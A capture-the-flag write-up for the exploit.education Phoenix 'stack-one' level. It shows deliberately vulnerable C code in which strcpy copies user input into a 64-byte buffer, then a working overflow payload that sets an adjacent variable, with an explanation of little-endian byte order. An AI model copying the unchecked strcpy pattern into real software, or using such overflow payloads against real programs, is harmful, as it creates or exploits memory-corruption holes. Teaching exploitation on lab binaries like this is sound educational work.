## Stack One
This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.

## Source Code
```c
/*
 * phoenix/stack-one, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x496c5962
 *
 * Did you hear about the kid napping at the local school?
 * It's okay, they woke up.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  if (argc < 2) {
    errx(1, "specify an argument, to be copied into the \"buffer\"");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, argv[1]);

  if (locals.changeme == 0x496c5962) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Getting closer! changeme is currently 0x%08x, we want 0x496c5962\n",
        locals.changeme);
  }

  exit(0);
}
```

## Challenge
The aim is to change the contents of the changeme variable to 0x496c5962

## Solution
Just like in `stack-zero`:
* We need to change the value of `locals.changeme`
* We have a vulnerable function (`strcpy()`) acting on `locals.buffer`

This time we want a specific value in `locals.changeme` = `0x496c5962` and our input is passed through the program's arguments.

### The Plan
`strcpy()` does not receive a length of chars to write, instead it copies from a source buffer to a dest buffer until it encounters a terminating null byte (it includes the byte).

It allows us to overflow from `locals.buffer` to `locals.changeme`.

### Breaking it
```console
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-one $(python -c "print 'a'*64 + '\x49\x6c\x59\x62'")
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x62596c49, we want 0x496c5962
```
Byte order is important, the value interpreted for `changeme` hints this system is `little-endian` - meaning the LSB (least-significant-byte) is first in memory.

![](/images/stack-1/0.png)
> Notice endianness only affects the layout of multi-byte representations like integers and some string encodings (like `UTF-16`).

We can verify this using the program `lscpu`, it displays CPU architecture information, among it is byte order.
```console
user@phoenix-amd64:~$ lscpu | grep "Byte Order"
Byte Order:            Little Endian
```

That's why our buffer representing a `32bit` integer was interpreted as `0x62596c49`.

Let's write it to memory in `little-endian` representation.
```console
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-one $(python -c "print 'a'*64 + '\x62\x59\x6c\x49'")
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```
🥳
